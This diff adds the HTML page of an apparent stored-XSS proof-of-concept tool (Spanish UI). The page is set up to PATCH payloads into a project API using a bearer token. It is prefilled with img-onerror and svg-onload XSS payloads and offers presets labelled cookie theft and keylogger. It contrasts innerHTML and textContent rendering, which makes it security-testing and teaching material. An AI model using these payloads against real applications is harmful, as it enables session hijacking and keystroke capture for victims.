@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>XSS PoC — Stored XSS Demo</title>
+  <link rel="stylesheet" href="style.css" />
+</head>
+<body>
+
+<header>
+  <div class="badge">⚠ PoC</div>
+  <h1>Stored <span>XSS</span> — Demo</h1>
+</header>
+
+<div class="grid">
+
+  <!-- Config -->
+  <div class="card">
+    <div class="card-title">Configuración del Target</div>
+
+    <label>Base URL</label>
+    <input id="baseUrl" type="text" value="https://localhost/ws/api/test" />
+
+    <label>ID Proyecto</label>
+    <input id="proyectoId" type="text" value="291" />
+
+    <label>Bearer Token</label>
+    <textarea id="token" rows="3">PEGA_TU_TOKEN_AQUI</textarea>
+
+    <div class="status-bar">
+      <div class="dot" id="statusDot"></div>
+      <span id="statusText">sin conexión</span>
+    </div>
+  </div>
+
+  <!-- Payload -->
+  <div class="card">
+    <div class="card-title">Payload de Inyección</div>
+
+    <label>nombre (campo vulnerable)</label>
+    <textarea id="nombre" rows="2"><img src=x onerror="alert('XSS ejecutado! dominio: '+document.domain)"></textarea>
+
+    <label>descripcion</label>
+    <textarea id="descripcion" rows="2"><svg onload="alert('XSS en descripcion')"></textarea>
+
+    <div class="card-title" style="margin-top:1rem; margin-bottom:0.5rem;">Payloads rápidos</div>
+    <div class="presets">
+      <button class="preset-btn" onclick="setPayload('alert')">alert básico</button>
+      <button class="preset-btn" onclick="setPayload('cookie')">robo cookie</button>
+      <button class="preset-btn" onclick="setPayload('domain')">domain info</button>
+      <button class="preset-btn" onclick="setPayload('svg')">SVG onload</button>
+      <button class="preset-btn" onclick="setPayload('img')">img onerror</button>
+      <button class="preset-btn" onclick="setPayload('keylog')">keylogger</button>
+    </div>
+
+    <div class="btn-row">
+      <button class="btn-primary" onclick="sendPayload()">▶ PATCH — Inyectar</button>
+      <button class="btn-secondary" onclick="getAndRender()">⬇ GET + Render</button>
+      <button class="btn-ghost" onclick="clearLog()">limpiar log</button>
+    </div>
+  </div>
+
+  <!-- Render vulnerable -->
+  <div class="card">
+    <div class="card-title">Render Vulnerable — <span style="color:var(--accent)">innerHTML</span></div>
+
+    <div class="zone-label red">⚠ nombre — innerHTML (ejecuta XSS)</div>
+    <div class="render-zone vulnerable" id="renderVulnNombre">— vacío —</div>
+
+    <div class="zone-label red" style="margin-top:1rem">⚠ descripcion — innerHTML (ejecuta XSS)</div>
+    <div class="render-zone vulnerable" id="renderVulnDesc">— vacío —</div>
+  </div>
+
+  <!-- Render seguro -->
+  <div class="card">
+    <div class="card-title">Render Seguro — <span style="color:var(--green)">textContent</span></div>
+
+    <div class="zone-label green">✓ nombre — textContent (escaped)</div>
+    <div class="render-zone safe" id="renderSafeNombre">— vacío —</div>
+
+    <div class="zone-label green" style="margin-top:1rem">✓ descripcion — textContent (escaped)</div>
+    <div class="render-zone safe" id="renderSafeDesc">— vacío —</div>
+  </div>
+
+  <!-- Log -->
+  <div class="card full">
+    <div class="card-title">Log de actividad</div>
+    <div id="log"><div class="log-entry"><span class="log-ts">--:--:--</span><span class="log-info">Esperando acción...</span></div></div>
+  </div>
+
+</div>
+
+<script src="script.js"></script>
+</body>
+</html>
